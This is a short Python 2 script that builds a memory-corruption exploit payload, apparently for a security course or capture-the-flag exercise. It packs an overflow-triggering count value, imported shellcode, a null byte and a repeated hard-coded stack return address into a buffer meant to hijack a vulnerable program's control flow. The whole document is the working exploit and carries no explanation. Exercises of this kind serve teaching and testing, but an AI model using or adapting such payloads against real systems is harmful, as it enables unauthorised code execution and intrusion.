from shellcode import shellcode
from struct import pack

count = 0x40000000
shellcodeAdd = 0xbffef200
print pack("<I", count) + shellcode + '\x00' + pack("<I", shellcodeAdd) * (0x59 - len(shellcode))

